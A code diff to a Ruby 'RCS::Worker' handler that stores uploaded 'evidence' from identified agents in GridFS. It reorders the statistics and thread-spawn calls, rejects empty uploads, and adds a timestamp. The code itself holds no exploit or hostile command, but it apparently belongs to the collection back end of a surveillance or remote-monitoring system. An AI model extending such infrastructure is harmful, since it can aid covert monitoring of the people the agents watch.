@@ -9,26 +9,22 @@ module RCS::Worker
       content = @request[:content]['content']
 
       return conflict unless content
+      return conflict if content.bytesize == 0
 
       ident = @params['_id'].slice(0..13)
       instance = @params['_id'].slice(15..-1).downcase
       uid = "#{ident}:#{instance}"
 
-      if content.bytesize == 0
-        trace(:error, "Received an empty evidence belonging to agent #{uid}")
-        return ok(bytes: 0)
-      end
+      InstanceWorkerMng.spawn_worker_thread(uid)
+
+      # update the evidence statistics (dump to local file config/worker_stats)
+      StatsManager.instance.add(inbound_evidence: 1, inbound_evidence_size: content.bytesize)
 
       # save the evidence in the db
       trace :debug, "Storing evidence #{uid} into local worker db"
-      grid_id = RCS::DB::GridFS.put(content, {filename: "#{uid}"}, "evidence", :worker)
-
-      # update the evidence statistics (dump to local file config/worker_stats)
-      StatsManager.instance.add(inbound_evidence: 1, inbound_evidence_size: @request[:content]['content'].bytesize)
+      grid_id = RCS::DB::GridFS.put(content, {filename: "#{uid}", metadata: {created_at: Time.now.utc.to_f}}, "evidence", :worker)
 
       trace :info, "Evidence [#{uid}][#{grid_id}] stored into local worker cache."
-
-      InstanceWorkerMng.spawn_worker_thread(uid)
 
       ok(bytes: content.size)
     rescue Exception => e
